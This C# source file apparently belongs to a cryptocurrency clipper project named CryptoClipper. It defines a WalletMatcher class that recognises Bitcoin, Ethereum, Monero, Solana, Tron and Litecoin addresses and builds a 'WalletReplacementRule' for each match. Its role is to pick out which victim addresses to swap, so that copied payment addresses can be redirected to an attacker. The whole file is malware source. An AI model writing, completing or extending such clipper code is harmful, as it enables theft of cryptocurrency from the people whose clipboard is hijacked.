using CryptoClipper.Models;
using CryptoClipper.Wallets;

namespace CryptoClipper.Core;

public sealed class WalletMatcher
{
    private readonly List<IWalletPattern> _patterns;

    public WalletMatcher()
    {
        _patterns =
        [
            new BitcoinMatcher(),
            new EthereumMatcher(),
            new MoneroMatcher(),
            new SolanaMatcher(),
            new TronMatcher(),
            new LitecoinMatcher()
        ];
    }

    public WalletReplacementRule? Match(string address)
    {
        foreach (var pattern in _patterns)
        {
            if (pattern.IsMatch(address))
            {
                return new WalletReplacementRule
                {
                    CoinType = pattern.CoinType,
                    OriginalAddress = address,
                    MatchedAt = DateTime.UtcNow
                };
            }
        }

        return null;
    }

    public IReadOnlyList<CoinType> SupportedCoins =>
        _patterns.Select(p => p.CoinType).ToList().AsReadOnly();
}
